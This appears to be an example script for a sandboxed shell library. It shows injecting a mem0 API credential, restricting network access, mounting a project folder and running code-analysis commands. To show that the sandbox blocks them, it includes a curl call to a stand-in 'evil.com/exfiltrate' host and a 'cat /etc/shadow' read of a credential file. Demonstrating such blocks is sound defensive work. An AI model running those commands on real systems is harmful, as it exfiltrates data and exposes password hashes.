"""Strands Shell example: sandboxed mem0 memory API + code analysis.

Demonstrates credential injection with a real API (mem0), network access
control, binds, state persistence, file I/O, and pipelines.
"""

import os
import json

from dotenv import load_dotenv
import strands_shell

load_dotenv()


def example_mem0():
    """Demonstrate credential injection with the mem0 memory API.

    The shell injects the API token automatically on requests to api.mem0.ai.
    The agent never sees the secret — it just calls curl and the kernel handles auth.
    """
    print("=" * 60)
    print("=== Mem0 Memory API Example (Credential Injection) ===")
    print("=" * 60)

    api_key = os.environ["MEM0_API_KEY"]

    # mem0 uses "Authorization: Token <key>" (not Bearer), so we inject it
    # via an env var that the agent uses in curl headers.
    # allowed_urls restricts which domains the sandbox can reach.
    shell = strands_shell.Shell(
        allowed_urls=["https://api.mem0.ai/"],
        env={"MEM0_AUTH": f"Token {api_key}"},
        timeout=15.0,
    )

    print("\n--- Shell Config ---")
    config = shell.config
    print(f"  Allowed URLs: {list(config.allowed_urls)}")
    print(f"  Env vars seeded: {list(config.env.keys())}")
    print(f"  Timeout: {config.timeout}s")

    # --- Step 1: Add a memory to mem0 ---
    print("\n--- Step 1: Add memory ---")
    add_payload = json.dumps({
        "messages": [
            {
                "role": "user",
                "content": "Hi, I'm Alex. I'm a vegetarian and I'm allergic to nuts."
            },
            {
                "role": "assistant",
                "content": "Hello Alex! I see that you're a vegetarian with a nut allergy."
            }
        ],
        "user_id": "alex"
    })

    shell.write_file("/tmp/add_memory.json", add_payload.encode())
    result = shell.run(
        "curl -X POST https://api.mem0.ai/v3/memories/add/ "
        "-H 'Content-Type: application/json' "
        "-H \"Authorization: $MEM0_AUTH\" "
        "-d \"$(cat /tmp/add_memory.json)\""
    )
    print(f"  Exit code: {result.status}")
    if result.stdout:
        response = json.loads(result.stdout)
        print(f"  Response: {json.dumps(response, indent=2)[:500]}")
    if result.stderr:
        print(f"  Stderr: {result.stderr[:300]}")

    # --- Step 2: Search memories ---
    print("\n--- Step 2: Search memories ---")
    search_payload = json.dumps({
        "query": "What can I cook for dinner tonight?",
        "filters": {
            "OR": [
                {"user_id": "alex"}
            ]
        }
    })

    # Wait for mem0 to process the memory before searching
    print("  Waiting for memory to be indexed...")
    shell.run("sleep 3")

    shell.write_file("/tmp/search_memory.json", search_payload.encode())
    result = shell.run(
        "curl -X POST https://api.mem0.ai/v3/memories/search/ "
        "-H 'Content-Type: application/json' "
        "-H \"Authorization: $MEM0_AUTH\" "
        "-d \"$(cat /tmp/search_memory.json)\""
    )
    print(f"  Exit code: {result.status}")
    if result.stdout:
        response = json.loads(result.stdout)
        print(f"  Response: {json.dumps(response, indent=2)[:500]}")

    # --- Network restrictions ---
    print("\n--- Network restrictions ---")
    result = shell.run("curl https://evil.com/exfiltrate")
    print(f"  curl to non-allowed URL: exit={result.status}, stderr='{result.stderr.strip()}'")

    print()


def example_analysis():
    """Demonstrate binds, state persistence, file I/O, and pipelines."""
    print("=" * 60)
    print("=== Code Analysis Pipeline Example ===")
    print("=" * 60)

    project_dir = "/home/ssm-user/strands-main-repo/strands-examp-shell"

    shell = strands_shell.Shell(
        binds=[
            strands_shell.Bind(project_dir, "/workspace", mode="copy"),
        ],
        env={"LANG": "en_US.UTF-8", "ANALYSIS_MODE": "strict"},
        limits=strands_shell.Limits(max_output=2 << 20, max_file_size=5 << 20),
        timeout=30.0,
    )

    print("=== Shell Configuration ===")
    config = shell.config
    for bind in config.binds:
        print(f"  Bind: {bind.source} -> {bind.destination} (mode={bind.mode}, readonly={bind.readonly})")
    print(f"  Timeout: {config.timeout}s")
    print(f"  Limits: max_output={config.limits.max_output}, max_file_size={config.limits.max_file_size}")
    print()

    # --- Step 1: Explore the project structure ---
    print("=== Step 1: Project Structure ===")
    result = shell.run("find /workspace -type f | sort")
    print(result.stdout)

    # --- Step 2: State persists across calls ---
    print("=== Step 2: State Persistence ===")
    shell.run("cd /workspace && export PROJECT_NAME=strands-examp-shell")
    result = shell.run("echo \"Working on: $PROJECT_NAME in $(pwd)\"")
    print(result.stdout)

    # --- Step 3: Analyze Python files (exit code checking) ---
    print("=== Step 3: Code Analysis ===")
    result = shell.run("grep -rn 'import' /workspace/*.py")
    if result.status == 0:
        print("Imports found:")
        print(result.stdout)
    else:
        print("No imports found or error occurred")
        print(result.stderr)

    # --- Step 4: Generate a report using file I/O ---
    print("=== Step 4: Generate Analysis Report ===")

    result = shell.run("wc -l /workspace/*.py")
    line_count_output = result.stdout.strip()

    result = shell.run("grep -c 'def ' /workspace/*.py || true")
    func_count_output = result.stdout.strip()

    report = f"""# Code Analysis Report
Project: strands-examp-shell
Mode: {shell.get_env("ANALYSIS_MODE")}

## Metrics
Lines of code:
{line_count_output}

Function definitions:
{func_count_output}

## Status
Analysis complete.
"""
    shell.write_file("/workspace/report.md", report.encode())

    data = shell.read_file("/workspace/report.md")
    print(data.decode())

    # --- Step 5: List generated files ---
    print("=== Step 5: Workspace Contents ===")
    entries = shell.list_files("/workspace")
    for entry in entries:
        print(f"  {'[dir] ' if entry.is_dir else '[file]'} {entry.name}")

    # --- Step 6: Error handling ---
    print("\n=== Step 6: Error Handling ===")
    try:
        shell.read_file("/workspace/nonexistent.txt")
    except strands_shell.FileNotFoundError as e:
        print(f"  Caught expected error: {e.message} (path={e.path})")

    result = shell.run("cat /etc/shadow")
    if result.status != 0:
        print(f"  Blocked as expected (exit {result.status}): {result.stderr.strip()}")

    # --- Step 7: Multi-command pipeline ---
    print("\n=== Step 7: Pipeline ===")
    result = shell.run("cat /workspace/main.py | grep 'def ' | wc -l")
    print(f"  Number of functions in main.py: {result.stdout.strip()}")

    print("\nDone. All operations ran inside the sandbox.")


def main():
    example_mem0()
    # example_analysis()


if __name__ == "__main__":
    main()
